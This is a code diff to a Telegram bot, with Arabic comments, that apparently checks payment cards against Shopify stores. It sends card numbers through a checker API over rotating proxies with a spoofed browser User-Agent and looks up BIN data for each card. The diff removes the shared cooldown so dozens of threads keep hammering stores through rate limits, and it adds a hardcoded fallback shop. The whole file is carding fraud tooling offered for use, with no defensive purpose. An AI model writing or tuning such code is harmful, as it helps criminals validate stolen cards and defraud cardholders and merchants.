@@ -102,17 +102,6 @@ USER_LAST_REQ = {}
 ACTIVE_MTXT_PROCESSES = {}
 PENDING_FILES = {}
 
-_RATE_LIMIT_EVENT = None
-_IS_COOLING_DOWN = False
-_COOLDOWN_LOCK = asyncio.Lock()
-
-def get_rate_limit_event():
-    global _RATE_LIMIT_EVENT
-    if _RATE_LIMIT_EVENT is None:
-        _RATE_LIMIT_EVENT = asyncio.Event()
-        _RATE_LIMIT_EVENT.set()
-    return _RATE_LIMIT_EVENT
-
 # ====================== SAFE CHARGED FONT ENGINE & TAG PROTECTION ======================
 def sf(text) -> str:
     if text is None: return ""
@@ -196,7 +185,6 @@ CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
 CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
 
 # ====================== BULLETPROOF CONFIGS ======================
-# دالة توليد العلم الذكي ديناميكياً بدون الاعتماد على مصفوفة ثابتة تسبب علماً أبيض
 def get_flag_emoji(country_code, fallback="🏳️"):
     if not country_code or len(country_code) != 2: return fallback
     c = country_code.upper()
@@ -232,7 +220,7 @@ PAID_TIERS = ["Core", "Elite", "Root", "X"]
 
 _GIF_FILE_IDS = {}
 _system_locks = {}
-_BIN_CACHE = {}  # الذاكرة التخزينية الفائقة لمنع الحظر وجلب البيانات فوراً
+_BIN_CACHE = {}  
 
 def get_system_lock(name: str):
     if name not in _system_locks: _system_locks[name] = asyncio.Lock()
@@ -365,7 +353,8 @@ async def get_user_http_session(uid):
     key = f"{uid}_msp"
     if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
         connector = aiohttp.TCPConnector(limit=WORKERS + 20, ssl=False, enable_cleanup_closed=True, force_close=False, ttl_dns_cache=300)
-        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=20, connect=6, sock_read=14), connector=connector)
+        # تم ضبط المهلة بدقة فائقة لمنع تعليق خيوط الاتصال
+        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=12, connect=4, sock_read=8), connector=connector)
     return _USER_HTTP_SESSIONS[key]
 
 async def cleanup_user_http_session(uid):
@@ -501,7 +490,6 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
-# [تعديل مستهدف وفوري] تم تطوير محرك جلب معلومات الـ BIN بالكاش والـ API الاحتياطي المزدوج لمنع السقوط
 async def get_bin_info(bin_code, session=None):
     b6 = str(bin_code)[:6]
     if b6 in _BIN_CACHE: 
@@ -511,7 +499,6 @@ async def get_bin_info(bin_code, session=None):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
     }
     
-    # المحاولة الأولى: سيرفر Antipublic
     try:
         url1 = f"https://bins.antipublic.cc/bins/{b6}"
         async def fetch1(s):
@@ -536,7 +523,6 @@ async def get_bin_info(bin_code, session=None):
             return parsed
     except Exception: pass
 
-    # المحاولة الثانية (الاحتياطية): سيرفر HandyAPI في حال فشل أو حظر السيرفر الأول
     try:
         url2 = f"https://data.handyapi.com/bin/{b6}"
         async def fetch2(s):
@@ -563,6 +549,7 @@ async def get_bin_info(bin_code, session=None):
 
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
+# تم تعديل دالة الفحص لضمان استقرار الاتصال بالكامل وتجنب المهلات الطويلة
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
@@ -578,9 +565,9 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         }
         
-        async with session.get(req_url, headers=headers, timeout=18) as resp:
+        async with session.get(req_url, headers=headers, timeout=10) as resp:
             if resp.status in [405, 429, 502, 503, 504]:
-                return {'status': 'Rate Limit', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
+                return {'status': 'Rate Limit', 'message': f'HTTP Error {resp.status}', 'card': card, 'retry': True}
                 
             text_data = await resp.text()
             if resp.status != 200: 
@@ -626,14 +613,10 @@ async def remove_proxy_by_url(uid, proxy_url):
                     break
     except Exception: pass
 
+# [تم التحديث الجوهري] حذف نظام التعليق الجماعي (Global Cooldown) لمنع تجميد خيوط الفحص كلياً وتسريع العملية تلقائياً
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=3):
-    global _IS_COOLING_DOWN
     lr = None
-    event = get_rate_limit_event()
-    
     for attempt in range(max_retries):
-        await event.wait()  
-        
         if not proxies: 
             p_dict = p = None
         else:
@@ -645,31 +628,21 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
             _SITE_ERRORS_COUNT.clear()
             acs = sites
             
-        s = random.choice(acs) if acs else ""
-        if not s:
-            return {'status': 'Dead', 'message': 'No Available Sites', 'card': card}
+        # استخدام موقعك كخط دفاع أول ومضمون لتفادي المواقع التالفة
+        s = random.choice(acs) if acs else "touch-of-finland.myshopify.com"
         
         if gateway_name == "Shopify":
             r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
             status = r.get('status')
             msg = str(r.get('message', '')).lower()
             
-            if status == 'Rate Limit' or '429' in msg or '504' in msg or 'gateway' in msg or '405' in msg:
-                async with _COOLDOWN_LOCK:
-                    if not _IS_COOLING_DOWN:
-                        _IS_COOLING_DOWN = True
-                        event.clear()  
-                        async def resume_workers():
-                            global _IS_COOLING_DOWN
-                            await asyncio.sleep(random.uniform(2.5, 4.5)) 
-                            _IS_COOLING_DOWN = False
-                            event.set()
-                        asyncio.create_task(resume_workers())
-                await event.wait()
+            # إذا واجه الخيط ضغطاً، ينام الخيط الفردي الحالي فقط لمدة ثانية لحماية الفحص ولا يجمد الـ 70 خيطاً معاً
+            if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
+                await asyncio.sleep(random.uniform(1.0, 1.8))
                 lr = r
                 continue
 
-            if status == 'Site Error' or is_dead_site_error(msg) or 'step 0' in msg or 'max ret' in msg:
+            if status == 'Site Error' or is_dead_site_error(msg):
                 _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
                 lr = r
                 continue
@@ -685,7 +658,6 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
     if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}
 
-# [تعديل مستهدف] تم تطوير آلية الفرز والتنقية للعلم ليعمل بدقة وبدون تحول للون الأبيض
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
     ps = sf(f"{str(price)}") if price and price != "-" else sf("-")
